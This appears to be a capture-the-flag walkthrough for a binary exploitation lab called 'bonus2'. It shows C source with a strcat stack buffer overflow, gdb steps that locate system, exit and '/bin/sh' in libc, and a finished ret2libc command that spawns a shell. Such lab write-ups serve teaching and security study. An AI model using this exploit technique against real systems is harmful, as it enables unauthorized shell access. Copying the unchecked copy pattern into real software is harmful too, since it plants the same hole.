```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int lang = 0;

void greetuser(char *user)
{
	char buffer[64];

	if (lang == 1)
	{
		strcpy(buffer, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 ");
	}
	else if (lang == 2)
	{
		strcpy(buffer, "Goedemiddag! ");
	}
	else if (lang == 0)
	{
		strcpy(buffer, "Hello ");
	}
	strcat(buffer, user);
	puts(buffer);
}

int main(int ac, char **av)
{
	char	buffer[72];     //0x28 + 0x20
	char	*env = NULL;

	if (ac != 3)
		return 1;

	memset(buffer, 0, 72);
	strncpy(buffer, av[1], 40);         // Copy first argument 40 bytes
	strncpy(&buffer[40], av[2], 32);    // Copy second argument 32 bytes
	env = getenv("LANG");
	if (env != 0)
	{
		if (memcmp(env, "fi", 2) == 0)
		{
			lang = 1;
		}
		else if (memcmp(env, "nl", 2) == 0)
		{
			lang = 2;
		}
	}

	greetuser(buffer);
	return 0;
}
```

- We know that the offset until reaching eip is 18 character for the second argument we pass to the program



- Find system and exit addresses from libc shared library.

```bash
info proc map
process 13689
Mapped address spaces:

...
	0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
...

Here is where our libc is loaded in memory, let's inspect if we can found system and exit addresses.

(gdb) info function system 
0xb7e6b060  system

(gdb) info function exit
0xb7e5ebe0  exit
```

--- 
- Find the string "/bin/sh" in de libc library

```bash
Now let's find the "/bin/sh" string

(gdb) find 0xb7e2c000,0xb7fcf000,"/bin/sh"
0xb7f8cc58
```

---
- We can now construct a ret2libc payload

```bash
export LANG=fi  # This enable us to write a lot of bytes and let us more input

./bonus2 $(python -c 'print 40 * "A"') $(python -c 'print 18 * "B" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"')
```